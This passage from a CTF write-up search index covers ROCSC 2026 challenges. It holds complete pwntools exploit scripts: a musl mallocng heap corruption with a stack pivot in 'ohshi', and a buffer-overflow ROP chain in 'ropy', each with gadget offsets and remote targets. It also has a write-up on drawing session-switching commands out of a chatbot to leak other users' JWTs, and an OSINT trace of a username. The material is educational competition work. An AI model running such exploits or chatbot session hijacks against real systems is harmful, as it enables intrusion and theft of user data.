\u2192 dump chats).</p>"},{"location":"rocsc2026/open-tellmewhy/writeup/#flag","title":"Flag","text":"<pre><code>CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/#references","title":"References","text":"<ul> <li>CVE-2025-46719 \u2014 NVD</li> <li>GHSA-9f4f-jv96-8766 \u2014 GitHub Advisory</li> <li>Patch commit</li> <li>Vulnerable code: MarkdownTokens.svelte L269-L279</li> </ul>"},{"location":"rocsc2026/oshi/writeup/","title":"ohshi \u2014 PWN Writeup","text":"<p>Author: Luma Category: PWN Remote: <code>nc 34.107.64.195 31323</code> Flag: <code>ROCSC{8870a25a9f58992387f32cbebbbc8adf3c172b582b2448c6bcd2532f642611b0}</code></p>"},{"location":"rocsc2026/oshi/writeup/#reconnaissance","title":"Reconnaissance","text":"<p>We are given a stripped 64-bit PIE ELF binary (<code>main</code>) dynamically linked against musl libc (<code>libc.so</code>, served as <code>/lib/ld-musl-x86_64.so.1</code>), along with a Dockerfile running Ubuntu 22.04 + xinetd.</p> <pre><code>$ checksec app/main\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n</code></pre> <p>All mitigations are enabled. The binary is linked against musl libc (707,056 bytes), which uses the mallocng heap allocator \u2014 significantly different from glibc's ptmalloc2.</p>"},{"location":"rocsc2026/oshi/writeup/#reverse-engineering","title":"Reverse Engineering","text":""},{"location":"rocsc2026/oshi/writeup/#program-structure","title":"Program structure","text":"<p>The binary implements a standard heap note menu:</p> <pre><code>1. Alloc\n2. Free\n3. Print\n4. Edit\n5. Exit\n</code></pre> <p>It maintains two parallel arrays in BSS:</p> Array BSS offset Description <code>sizes[16]</code> <code>0x4060</code> 16 \u00d7 8-byte size entries <code>chunks[16]</code> <code>0x40e0</code> 16 \u00d7 8-byte chunk pointer entries <p>BSS ends at exactly <code>0x4160</code>.</p>"},{"location":"rocsc2026/oshi/writeup/#functions","title":"Functions","text":"<ul> <li>alloc(idx, size): Reads index and size, calls <code>malloc(size)</code>, stores the pointer in <code>chunks[idx]</code> and size in <code>sizes[idx]</code>, then reads content via <code>read(0, chunks[idx], size)</code>. No upper-bound check on the index \u2014 only checks <code>idx &lt; 0</code> (negative).</li> <li>free(idx): Calls <code>free(chunks[idx])</code>, zeroes both <code>chunks[idx]</code> and <code>sizes[idx]</code>.</li> <li>print(idx): Calls <code>write(1, chunks[idx], sizes[idx] &amp; 0xfff)</code>. One-time use \u2014 a <code>print_count</code> flag is set after first call.</li> <li>edit(idx): Reads new content via <code>read(0, chunks[idx], sizes[idx] &amp; 0xfff)</code>, prints <code>\"Edited.\"</code>.</li> </ul>"},{"location":"rocsc2026/oshi/writeup/#seccomp-sandbox","title":"Seccomp sandbox","text":"<p>A BPF seccomp filter blocks:</p> Blocked syscall Number <code>execve</code> 59 <code>execveat</code> 322 <code>prctl</code> 157 <p>Everything else is allowed, including <code>open</code>/<code>read</code>/<code>write</code> \u2014 so the goal is an ORW (open-read-write) chain to exfiltrate <code>/home/ctf/flag.txt</code>.</p>"},{"location":"rocsc2026/oshi/writeup/#vulnerability","title":"Vulnerability","text":"<p>The index parameter in all operations is only checked for negative values (<code>if (idx &lt; 0)</code>), but there is no upper-bound check against 16. Using index 16 triggers an interesting aliasing:</p> <ul> <li><code>sizes[16]</code> is at <code>0x4060 + 16\u00d78 = 0x40e0</code> \u2014 which is exactly the start of <code>chunks[]</code>. So <code>sizes[16]</code> aliases <code>chunks[0]</code>.</li> <li><code>chunks[16]</code> is at <code>0x40e0 + 16\u00d78 = 0x4160</code> \u2014 which is past the end of BSS, landing in the musl mallocng meta area (the internal bookkeeping region that immediately follows BSS at runtime).</li> </ul> <p>This gives us: 1. OOB Read: <code>print(16)</code> reads from the meta area pointer at <code>chunks[16]</code> for <code>sizes[16]</code> = <code>chunks[0]</code> bytes (a heap pointer, so typically ~512+ bytes of meta data). 2. OOB Write: <code>edit(16)</code> writes to the same meta area, allowing corruption of mallocng metadata.</p>"},{"location":"rocsc2026/oshi/writeup/#musl-mallocng-internals","title":"musl mallocng internals","text":"<p>musl's mallocng allocator organizes memory into groups by sizeclass. Each group has a meta struct (40 bytes):</p> <pre><code>struct meta {\n    struct meta *prev;      // +0x00\n    struct meta *next;      // +0x08\n    void        *mem;       // +0x10  \u2014 pointer to the group's memory region\n    uint32_t    avail_mask; // +0x18  \u2014 bitmask of available slots\n    uint32_t    freed_mask; // +0x1c  \u2014 bitmask of freed slots\n    // +0x20: bitfield: last_idx(5), freeable(1), sizeclass(6), maplen(52)\n};\n</code></pre> <p>When <code>malloc()</code> is called for sizeclass SC17 (stride = 672 bytes = 0x2A0), the allocator: 1. Finds a meta with <code>avail_mask != 0</code> 2. Picks a slot from <code>avail_mask</code> 3. Returns <code>mem + slot * stride + 0x10 + offset</code> where offset depends on slack</p> <p>The <code>mem</code> field directly controls where the returned pointer lands. Corrupting <code>meta.mem</code> lets us make <code>malloc()</code> return an arbitrary address.</p>"},{"location":"rocsc2026/oshi/writeup/#deterministic-placement-with-slack0","title":"Deterministic placement with slack=0","text":"<p>mallocng adds a randomized offset: <code>offset = (counter * 16) % ((stride - size - IB) / 16 * 16)</code> where IB=4. For SC17 with <code>malloc(668)</code>: slack = <code>(672 - 668 - 4) / 16 = 0</code>, forcing offset to always be 0 regardless of the counter. This makes the returned pointer fully deterministic:</p> <pre><code>returned_ptr = mem + slot * 0x2A0 + 0x10\n</code></pre>"},{"location":"rocsc2026/oshi/writeup/#exploitation-strategy","title":"Exploitation Strategy","text":""},{"location":"rocsc2026/oshi/writeup/#overview","title":"Overview","text":"<ol> <li>Leak libc via OOB print of the meta area</li> <li>Corrupt meta.mem via OOB edit to point at <code>stdout</code></li> <li>Allocate over stdout \u2014 <code>malloc(668)</code> returns a chunk at <code>__stdout_FILE</code></li> <li>Corrupt the FILE struct to trigger a stack pivot on the next <code>printf()</code> call</li> <li>ORW ROP chain reads and prints the flag</li> </ol>"},{"location":"rocsc2026/oshi/writeup/#step-1-heap-grooming-libc-leak","title":"Step 1 \u2014 Heap grooming + libc leak","text":"<pre><code>do_alloc(p, 1, 512, b'A' * 512)   # SC17 slot 1\ndo_alloc(p, 0, 512, b'B' * 512)   # SC17 slot 0 \u2014 chunks[0] = heap_ptr\ndo_print(p, 16)                     # leaks meta area\n</code></pre> <p>After the two allocations, <code>chunks[0]</code> is a heap pointer (~0x500+ in value). Since <code>sizes[16]</code> aliases <code>chunks[0]</code>, the <code>print(16)</code> call writes <code>chunks[0]</code> bytes from address <code>chunks[16]</code> (past BSS) \u2014 dumping the entire meta area.</p> <p>The leaked data contains: - Heap pointers (meta <code>prev</code>/<code>next</code>/<code>mem</code> for heap groups) \u2014 the majority - One libc pointer \u2014 a <code>meta.mem</code> pointing into libc's BSS at <code>libc_base + 0xaff40</code></p> <p>We identify the libc pointer dynamically: group all pointers by their upper 32 bits, find the minority prefix (the single libc pointer among many heap pointers), and subtract the known offset.</p>"},{"location":"rocsc2026/oshi/writeup/#step-2-corrupt-sc17-metamem","title":"Step 2 \u2014 Corrupt SC17 meta.mem","text":"<p>We parse the leaked meta area to find the SC17 meta struct (sizeclass field == 17) that still has available slots. Then we compute:</p> <pre><code>target_mem = stdout_addr - (slot * 0x2A0 + 0x10)\n</code></pre> <p>and overwrite the meta's <code>mem</code> field via <code>edit(16)</code>, so the next SC17 allocation returns a pointer at <code>stdout_addr</code>.</p>"},{"location":"rocsc2026/oshi/writeup/#step-3-overwrite-stdout-file-struct","title":"Step 3 \u2014 Overwrite stdout FILE struct","text":"<p>We call <code>alloc(2, 668)</code> \u2014 the allocator finds the corrupted SC17 meta, picks the available slot, and returns <code>target_mem + slot * 0x2A0 + 0x10 = stdout_addr</code>. The binary's <code>read()</code> in the alloc function writes our payload directly over <code>__stdout_FILE</code>.</p>"},{"location":"rocsc2026/oshi/writeup/#step-4-stack-pivot-via-__fwritex","title":"Step 4 \u2014 Stack pivot via __fwritex","text":"<p>After <code>alloc</code> returns, the main loop calls <code>printf()</code> to display the menu. This triggers:</p> <ol> <li><code>vfprintf(stdout, ...)</code> \u2014 checks <code>lock == -1</code> (skip FLOCK), <code>buf_size == 1</code> (skip internal buffering), <code>wend != 0</code> (proceed to format)</li> <li><code>printf_core</code> \u2192 <code>out()</code> \u2192 <code>__fwritex(data, len, f)</code> at <code>libc+0x5ca50</code></li> <li><code>__fwritex</code>: since <code>wend - wpos = 0 &lt; len</code>, it tail-calls <code>f-&gt;write(f, data, len)</code></li> <li>The <code>write</code> function pointer at <code>FILE+0x48</code> is our PIVOT gadget (<code>libc+0x789f5</code>):    <pre><code>mov rsp, [rdi+0x30]   ; rsp = rop_addr (from FILE+0x30)\njmp [rdi+0x38]         ; jump to ret gadget (from FILE+0x38)\n</code></pre></li> <li>This pivots the stack to our ROP chain embedded in the FILE struct at <code>stdout+0x100</code>.</li> </ol>"},{"location":"rocsc2026/oshi/writeup/#fake-file-struct-layout","title":"Fake FILE struct layout","text":"Offset Value Purpose <code>+0x00</code> <code>0</code> flags <code>+0x20</code> <code>stdout_addr</code> wend (== wpos \u2192 remaining = 0) <code>+0x28</code> <code>stdout_addr</code> wpos <code>+0x30</code> <code>stdout + 0x100</code> pivot target RSP (ROP chain) <code>+0x38</code> <code>ret</code> gadget pivot target JMP <code>+0x48</code> pivot gadget <code>write</code> fn ptr \u2192 triggers pivot <code>+0x58</code> <code>stdout_addr</code> buf <code>+0x60</code> <code>1</code> buf_size (must be \u2260 0) <code>+0x78</code> <code>1</code> fd = stdout <code>+0x8c</code> <code>-1</code> lock (skip FLOCK) <code>+0x90</code> <code>-1</code> lbf <code>+0x98</code> <code>\"/home/ctf/flag.txt\\0\"</code> flag path string <code>+0x100</code> ROP chain ORW chain"},{"location":"rocsc2026/oshi/writeup/#step-5-orw-rop-chain","title":"Step 5 \u2014 ORW ROP chain","text":"<pre><code>open(\"/home/ctf/flag.txt\", 0)      \u2192 fd = 3\nread(3, writable_buf, 128)          \u2192 read flag\nwrite(1, writable_buf, 128)         \u2192 print flag\nexit(0)                             \u2192 clean exit\n</code></pre>"},{"location":"rocsc2026/oshi/writeup/#rop-gadgets-from-musl-libc","title":"ROP gadgets (from musl libc)","text":"Gadget Offset Bytes <code>pop rdi; ret</code> <code>0x152a1</code> <code>5f c3</code> <code>ret</code> <code>0x152a2</code> <code>c3</code> <code>pop rsi; ret</code> <code>0x1b0a1</code> <code>5e c3</code> <code>pop rdx; ret</code> <code>0x2a50b</code> <code>5a c3</code> <code>pop rax; ret</code> <code>0x16a86</code> <code>58 c3</code> <code>syscall; ret</code> <code>0x21270</code> <code>0f 05 c3</code> <code>mov rsp,[rdi+0x30]; jmp [rdi+0x38]</code> <code>0x789f5</code> <code>48 8b 67 30 ff 67 38</code>"},{"location":"rocsc2026/oshi/writeup/#key-challenges-and-pitfalls","title":"Key challenges and pitfalls","text":"<ol> <li> <p>musl mallocng vs glibc ptmalloc2: The entire heap exploitation strategy differs \u2014 no tcache, no fastbins, no unsorted bin attacks. Instead, we target the <code>meta.mem</code> field.</p> </li> <li> <p>Deterministic chunk placement: Using <code>malloc(668)</code> instead of <code>malloc(512)</code> eliminates the random offset added by mallocng's <code>enframe()</code> function (slack = 0).</p> </li> <li> <p>Dynamic libc leak: The meta area layout varies between runs and environments. Rather than hardcoding an offset, we dynamically identify the single libc pointer among many heap pointers by finding the minority address-range prefix.</p> </li> <li> <p>buf_size must be non-zero: If <code>buf_size == 0</code>, musl's <code>vfprintf</code> takes an internal buffering path that zeroes <code>wend</code>/<code>wbase</code>/<code>wpos</code>, destroying our pivot setup before it triggers.</p> </li> <li> <p>Synchronization with pwntools: The <code>print(16)</code> leak dumps raw binary data that may contain <code>&gt;</code> bytes, causing premature <code>recvuntil</code> matches. We use <code>recvuntil(b'5. Exit\\n&gt; ')</code> as a more specific delimiter, then carefully track which menu prompt has been consumed.</p> </li> </ol>"},{"location":"rocsc2026/oshi/writeup/#exploit","title":"Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport struct, sys\nfrom collections import Counter\n\ncontext.arch = 'amd64'\n\nREMOTE = False\nRHOST, RPORT = '34.107.64.195', 31323\nLHOST, LPORT = '127.0.0.1', 3001\n\nKNOWN_LIBC_MEMS = [0xaff40]\nSTDOUT_OFF      = 0xad280\nPOP_RDI = 0x152a1; RET_GAD = 0x152a2; POP_RSI = 0x1b0a1\nPOP_RDX = 0x2a50b; POP_RAX = 0x16a86; SYSCALL = 0x21270\nPIVOT   = 0x789f5\nSC17_STRIDE = 0x2A0; ALLOC_SIZE = 668; META_SIZE = 0x28\n\ndef conn():\n    return remote(RHOST, RPORT) if REMOTE else remote(LHOST, LPORT)\n\ndef menu(p, c):  p.sendlineafter(b'&gt; ', str(c).encode())\ndef do_alloc(p, idx, sz, data):\n    menu(p, 1); p.sendlineafter(b'Index: ', str(idx).encode())\n    p.sendlineafter(b'Size: ', str(sz).encode()); p.sendafter(b'Content: ', data)\ndef do_print(p, idx):\n    menu(p, 3); p.sendlineafter(b'Index: ', str(idx).encode())\ndef parse_meta(raw, i):\n    o = i * META_SIZE\n    if o + META_SIZE &gt; len(raw): return None\n    return {'off': o, 'mem': u64(raw[o+16:o+24]),\n            'avail_mask': struct.unpack_from('&lt;I', raw, o+24)[0],\n            'sizeclass': (u64(raw[o+32:o+40]) &gt;&gt; 6) &amp; 0x3f}\n\ndef exploit():\n    p = conn()\n\n    # Step 1: heap grooming\n    do_alloc(p, 1, 512, b'A'*512)\n    do_alloc(p, 0, 512, b'B'*512)\n\n    # Step 2: leak libc via OOB print\n    do_print(p, 16)\n    resp = p.recvuntil(b'5. Exit\\n&gt; ', timeout=10)\n    dm = resp.find(b'Data: ')\n    if dm &gt;= 0: resp = resp[dm+6:]\n    mm = resp.rfind(b'\\n1. Alloc')\n    raw = resp[:mm] if mm &gt;= 0 else resp\n\n    # Dynamic libc pointer detection\n    ptrs = [(o, u64(raw[o:o+8]), u64(raw[o:o+8])&gt;&gt;32)\n            for o in range(0, len(raw)-7, 8) if 0x1000 &lt; u64(raw[o:o+8]) &lt; 0x7fffffffffff]\n    majority = Counter(pf for _,_,pf in ptrs).most_common(1)[0][0]\n    libc_cands = [(o, v) for o, v, pf in ptrs if pf != majority]\n\n    libc_base = None\n    for _, val in libc_cands:\n        for km in KNOWN_LIBC_MEMS:\n            c = val - km\n            if c &gt; 0 and (c &amp; 0xfff) == 0: libc_base = c; break\n        if libc_base: break\n    stdout_addr = libc_base + STDOUT_OFF\n\n    # Find SC17 meta with available slot\n    sc17 = next(m for i in range(len(raw)//META_SIZE)\n                if (m := parse_meta(raw, i)) and m['sizeclass']==17 and m['avail_mask'])\n    avail = sc17['avail_mask']\n    slot = next(s for s in range(8) if avail &amp; (1&lt;&lt;s))\n    slot_base = slot * SC17_STRIDE + 0x10\n\n    # Step 3: corrupt meta.mem \u2192 stdout\n    target_mem = stdout_addr - slot_base\n    edit_data = bytearray(raw)\n    edit_data[sc17['off']+16 : sc17['off']+24] = p64(target_mem)\n    p.sendline(b'4')\n    p.sendlineafter(b'Index: ', b'16')\n    p.sendafter(b'New Content: ', bytes(edit_data))\n\n    # Step 4: alloc at stdout with FILE + ORW payload\n    G = lambda off: libc_base + off\n    pay = bytearray(ALLOC_SIZE)\n    struct.pack_into('&lt;Q', pay, 0x20, stdout_addr)           # wend\n    struct.pack_into('&lt;Q', pay, 0x28, stdout_addr)           # wpos\n    struct.pack_into('&lt;Q', pay, 0x30, stdout_addr + 0x100)   # pivot RSP\n    struct.pack_into('&lt;Q', pay, 0x38, G(RET_GAD))            # pivot JMP\n    struct.pack_into('&lt;Q', pay, 0x48, G(PIVOT))              # write fn\n    struct.pack_into('&lt;Q', pay, 0x60, 1)                     # buf_size\n    struct.pack_into('&lt;I', pay, 0x78, 1)                     # fd\n    struct.pack_into('&lt;i', pay, 0x8c, -1)                    # lock\n    struct.pack_into('&lt;i', pay, 0x90, -1)                    # lbf\n    pay[0x98:0x98+19] = b\"/home/ctf/flag.txt\\x00\"\n\n    buf = libc_base + 0xae000\n    rop = flat(\n        G(POP_RDI), stdout_addr+0x98, G(POP_RSI), 0, G(POP_RAX), 2, G(SYSCALL),\n        G(POP_RDI), 3, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 0, G(SYSCALL),\n        G(POP_RDI), 1, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 1, G(SYSCALL),\n        G(POP_RDI), 0, G(POP_RAX), 60, G(SYSCALL),\n    )\n    pay[0x100:0x100+len(rop)] = rop\n\n    p.sendlineafter(b'&gt; ', b'1')\n    p.sendlineafter(b'Index: ', b'2')\n    p.sendlineafter(b'Size: ', str(ALLOC_SIZE).encode())\n    p.sendafter(b'Content: ', bytes(pay))\n\n    # Step 5: receive flag\n    result = p.recvall(timeout=5)\n    print(result)\n\nif __name__ == '__main__':\n    REMOTE = '--remote' in sys.argv\n    exploit()\n</code></pre>"},{"location":"rocsc2026/oshi/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{8870a25a9f58992387f32cbebbbc8adf3c172b582b2448c6bcd2532f642611b0}\n</code></pre>"},{"location":"rocsc2026/ropy/writeup/","title":"ropy \u2014 PWN Writeup","text":"<p>Author: Luma Category: PWN Remote: <code>nc 34.40.124.58 30427</code></p>"},{"location":"rocsc2026/ropy/writeup/#reconnaissance","title":"Reconnaissance","text":"<p>We are given a stripped 64-bit ELF binary (<code>main</code>), the remote libc (<code>libc.so.6</code>), and the dynamic linker (<code>ld-linux-x86-64.so.2</code>).</p> <pre><code>$ checksec dev/main\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x3fe000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n</code></pre> <p>Key takeaways: No PIE, No canary, NX enabled. SHSTK/IBT headers are present but not enforced by the kernel.</p>"},{"location":"rocsc2026/ropy/writeup/#reverse-engineering","title":"Reverse Engineering","text":"<p>Disassembling the binary reveals three main phases:</p>"},{"location":"rocsc2026/ropy/writeup/#1-anti-debug-fd-pollution-0x40137d","title":"1. Anti-debug / fd pollution (<code>0x40137d</code>)","text":"<p>The binary reads 4 bytes from <code>/dev/urandom</code> to seed <code>srand()</code>, then computes <code>N = rand() % 0x6001 + 0x1000</code> and opens <code>/dev/null</code> that many times (4096\u201328672 times) without closing them. This means the file descriptor returned by any subsequent <code>open()</code> call will be some unpredictable large number \u2014 we can't hardcode the fd.</p> <p>After the loop it <code>sleep(3)</code>s.</p>"},{"location":"rocsc2026/ropy/writeup/#2-seccomp-sandbox-0x401448","title":"2. Seccomp sandbox (<code>0x401448</code>)","text":"<p>A seccomp filter is installed with <code>SCMP_ACT_KILL</code> as default, allowing only three syscalls:</p> Syscall Number <code>read</code> 0 <code>write</code> 1 <code>open</code> 2 <p>This means no <code>execve</code>, no <code>mmap</code>, no <code>mprotect</code> \u2014 we must use an open-read-write (ORW) chain.</p>"},{"location":"rocsc2026/ropy/writeup/#3-vulnerable-function-0x401566","title":"3. Vulnerable function (<code>0x401566</code>)","text":"<pre><code>push   rbp\nmov    rbp, rsp\nadd    rsp, -0x80          ; 128-byte buffer\nlea    rax, [rbp-0x80]\nmov    rdi, rax\ncall   gets                ; unbounded read \u2192 buffer overflow\nleave\nret\n</code></pre> <p>The buffer is 0x80 (128) bytes. With 8 bytes for the saved <code>rbp</code>, we need 0x88 = 136 bytes of padding to reach the return address.</p>"},{"location":"rocsc2026/ropy/writeup/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>Since we can only use <code>open</code>/<code>read</code>/<code>write</code> syscalls, the plan is a two-stage ROP attack:</p> <p>Stage 1 \u2014 Leak libc base: 1. Overflow the buffer to build a ROP chain that calls <code>puts(open@GOT)</code> to leak the resolved address of <code>open</code> in libc. 2. Return to the vulnerable function for a second input.</p> <p>Stage 2 \u2014 ORW chain: 1. <code>gets(bss_addr)</code> \u2014 read the string <code>\"flag.txt\"</code> into a writable BSS address. 2. <code>open(\"flag.txt\", 0)</code> via <code>syscall</code> \u2014 the returned fd (in <code>rax</code>) is unknown. 3. <code>xchg eax, edi</code> \u2014 transfer the fd from <code>rax</code> into <code>rdi</code> for the next syscall. 4. <code>read(fd, bss_buf, 200)</code> via <code>syscall</code> \u2014 read flag contents into BSS. 5. <code>write(1, bss_buf, 200)</code> via <code>syscall</code> \u2014 print the flag to stdout.</p>"},{"location":"rocsc2026/ropy/writeup/#why-xchg-eax-edi-and-not-mov-edi-eax","title":"Why <code>xchg eax, edi</code> and not <code>mov edi, eax</code>?","text":"<p>ROPgadget finds <code>mov edi, eax; ret</code> at libc offset <code>0x233e2f</code>, but this address falls in libc's debug/DWARF section, which is not mapped into memory at runtime (outside all <code>PT_LOAD</code> segments). Jumping there causes an immediate SIGSEGV.</p> <p>The correct gadget is <code>xchg eax, edi; ret</code> at offset <code>0x14a225</code>, located within the executable <code>PT_LOAD RX</code> segment (<code>0x28000</code>\u2013<code>0x1bc3c1</code>).</p>"},{"location":"rocsc2026/ropy/writeup/#gadgets-used","title":"Gadgets Used","text":"<p>From the binary (no PIE):</p> Gadget Address <code>pop rdi; ret</code> <code>0x401316</code> <code>ret</code> <code>0x40101a</code> <code>puts@plt</code> <code>0x401154</code> <code>gets@plt</code> <code>0x4011b4</code> <code>open@GOT</code> <code>0x404068</code> Vulnerable fn <code>0x401566</code> <p>From libc (offsets):</p> Gadget Offset <code>pop rsi; ret</code> <code>0x2be51</code> <code>pop rdx; pop rcx; pop rbx; ret</code> <code>0x108b73</code> <code>pop rax; ret</code> <code>0x45eb0</code> <code>syscall; ret</code> <code>0x91316</code> <code>xchg eax, edi; ret</code> <code>0x14a225</code>"},{"location":"rocsc2026/ropy/writeup/#exploit","title":"Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport os\n\nSCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\n\ncontext.binary = e = ELF(os.path.join(SCRIPT_DIR, 'dev/main'))\nlibc            = ELF(os.path.join(SCRIPT_DIR, 'dev/libc.so.6'))\n\nVULN_FN   = 0x401566\nPOP_RDI   = 0x401316\nRET       = 0x40101a\nPUTS_PLT  = e.plt['puts']\nGETS_PLT  = e.plt['gets']\nOPEN_GOT  = e.got['open']\n\nBSS_FLAG_NAME = 0x4041a0\nBSS_FLAG_BUF  = 0x4041d0\nOVERFLOW      = 0x88\n\nOFF_POP_RSI         = 0x2be51\nOFF_POP_RDX_RCX_RBX = 0x108b73\nOFF_SYSCALL         = 0x91316\nOFF_POP_RAX         = 0x45eb0\nOFF_XCHG_EAX_EDI   = 0x14a225\n\nio = remote('34.40.124.58', 30427)\n\n# Wait for the binary to finish its anti-debug loop + sleep\nio.recvuntil(b'Hello! What is your name?\\n', timeout=60)\n\n# \u2500\u2500 Stage 1: leak libc \u2500\u2500\nio.sendline(b'A' * OVERFLOW + flat(\n    POP_RDI, OPEN_GOT, RET, PUTS_PLT, VULN_FN\n))\n\nleak      = u64(io.recvline().strip().ljust(8, b'\\x00'))\nlibc_base = leak - libc.sym['open']\nlog.success(f'libc base = {hex(libc_base)}')\n\n# \u2500\u2500 Stage 2: ORW chain \u2500\u2500\nio.recvuntil(b'Hello! What is your name?\\n', timeout=10)\n\npop_rsi         = libc_base + OFF_POP_RSI\npop_rdx_rcx_rbx = libc_base + OFF_POP_RDX_RCX_RBX\nsyscall_ret     = libc_base + OFF_SYSCALL\npop_rax         = libc_base + OFF_POP_RAX\nxchg_eax_edi    = libc_base + OFF_XCHG_EAX_EDI\n\nio.sendline(b'A' * OVERFLOW + flat(\n    # gets(\"flag.txt\" \u2192 BSS)\n    POP_RDI, BSS_FLAG_NAME, GETS_PLT,\n    # open(\"flag.txt\", 0)\n    POP_RDI, BSS_FLAG_NAME, pop_rsi, 0,\n    pop_rdx_rcx_rbx, 0, 0, 0, pop_rax, 2, syscall_ret,\n    # xchg eax,edi \u2192 rdi = fd\n    xchg_eax_edi,\n    # read(fd, buf, 200)\n    pop_rsi, BSS_FLAG_BUF, pop_rdx_rcx_rbx, 200, 0, 0,\n    pop_rax, 0, syscall_ret,\n    # write(1, buf, 200)\n    POP_RDI, 1, pop_rsi, BSS_FLAG_BUF,\n    pop_rdx_rcx_rbx, 200, 0, 0, pop_rax, 1, syscall_ret,\n))\nio.sendline(b'flag.txt')\n\nprint(io.recv(512, timeout=10))\n</code></pre>"},{"location":"rocsc2026/ropy/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{960bf98820d962e0b4a15d12485c075aab5dc873568fecaf6d344b6474de2c98}\n</code></pre>"},{"location":"rocsc2026/session-gpt/writeup/","title":"Session-GPT \u2014 ML/AI Writeup","text":"<p>Category: ML/AI Flag: <code>ctf{4620c10465bb2c85c2bc9804972bb75c1d72a4782100d09d1a0bb72eb576b772}</code></p>"},{"location":"rocsc2026/session-gpt/writeup/#overview","title":"Overview","text":"<p>A chatbot application where each user gets an isolated conversation session identified by an 8-character hex string. The chatbot exposes hidden administrative commands that allow lateral movement between sessions by leaking JWTs, ultimately granting access to other users' conversations.</p>"},{"location":"rocsc2026/session-gpt/writeup/#reconnaissance","title":"Reconnaissance","text":""},{"location":"rocsc2026/session-gpt/writeup/#probing-the-chatbots-capabilities","title":"Probing the chatbot's capabilities","text":"<p>By asking the chatbot about its features and what it can do, it eventually disclosed a set of internal commands it is able to execute:</p> Command Description <code>List sessions</code> Enumerates all active sessions, each identified by an 8-character hex string <code>Switch session &lt;hex&gt;</code> Switches the current context to the specified session <p>These commands are not documented anywhere in the UI \u2014 they are only discoverable through prompt interaction with the bot.</p>"},{"location":"rocsc2026/session-gpt/writeup/#exploitation","title":"Exploitation","text":""},{"location":"rocsc2026/session-gpt/writeup/#step-1-enumerate-sessions","title":"Step 1 \u2014 Enumerate sessions","text":"<p>Running the <code>List sessions</code> command returned a list of all active 8-character hex session identifiers. Each identifier corresponds to a different user's conversation session.</p>"},{"location":"rocsc2026/session-gpt/writeup/#step-2-hijack-sessions-via-jwt-leak","title":"Step 2 \u2014 Hijack sessions via JWT leak","text":"<p>Using <code>Switch session &lt;hex&gt;</code> with one of the discovered session IDs caused the chatbot to return the JWT token associated with that session. This is the critical vulnerability: the application hands out valid authentication tokens for arbitrary sessions on request.</p>"},{"location":"rocsc2026/session-gpt/writeup/#step-3-read-other-users-messages","title":"Step 3 \u2014 Read other users' messages","text":"<p>After switching to a target session and obtaining its JWT, a simple page refresh caused the browser to authenticate under the new session. This granted full read access to the conversation history of that session.</p>"},{"location":"rocsc2026/session-gpt/writeup/#step-4-find-the-flag","title":"Step 4 \u2014 Find the flag","text":"<p>By iterating through the available sessions \u2014 switching, refreshing, and inspecting the conversation history \u2014 the flag was found inside one of the other users' chat logs.</p>"},{"location":"rocsc2026/session-gpt/writeup/#root-cause","title":"Root Cause","text":"<p>The chatbot's session-management commands lack any authorization checks. Any authenticated user can:</p> <ol> <li>Enumerate all existing sessions (<code>List sessions</code>)</li> <li>Obtain the JWT for any session (<code>Switch session</code>)</li> <li>Impersonate any user by using the leaked JWT</li> </ol> <p>This is a classic lateral movement vulnerability \u2014 the ability to pivot from one authenticated context to another without proper access control, compounded by the chatbot leaking sensitive authentication material (JWTs) through its conversational interface.</p>"},{"location":"rocsc2026/wonderful-strangers/writeup/","title":"Wonderful Strangers \u2014 OSINT Writeup","text":"<p>Category: OSINT Flag: <code>ROCSC{h0w_d0e5_h3_m0v3_l1k3_th1s}</code></p>"},{"location":"rocsc2026/wonderful-strangers/writeup/#overview","title":"Overview","text":"<p>We are given a username \u2014 <code>memepie6767</code> \u2014 and must use OSINT techniques to trace the user's online presence, identify their connections, and find the flag.</p>"},{"location":"rocsc2026/wonderful-strangers/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/wonderful-strangers/writeup/#step-1-username-enumeration-with-sherlock","title":"Step 1 \u2014 Username Enumeration with Sherlock","text":"<p>Using Sherlock to search for the username <code>memepie6767</code> across hundreds of platforms, we find accounts on several sites:</p> <ul> <li>Roblox \u2014 https://www.roblox.com/user.aspx?username=memepie6767</li> <li>Wikipedia</li> <li>YouTube</li> <li>Livelib</li> </ul> <p>The Roblox profile is the most relevant lead.</p>"},{"location":"rocsc2026/wonderful-strangers/writeup/#step-2-investigate-roblox-connections","title":"Step 2 \u2014 Investigate Roblox Connections","text":"<p>Checking the Roblox profile's friends list, we find a friend named BoboNashu. This user's Roblox profile description contains a clue: they mention posting weekly videos.</p>"},{"location":"rocsc2026/wonderful-strangers/writeup/#step-3-find-the-youtube-channel","title":"Step 3 \u2014 Find the YouTube Channel","text":"<p>Searching for \"BoboNashu\" on YouTube, we find their channel which has video uploads. In one of the videos, the flag is hidden in the audio track.</p>"},{"location":"rocsc2026/wonderful-strangers/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{h0w_d0e5_h3_m0v3_l1k3_th1s}\n</code></pre>"}]}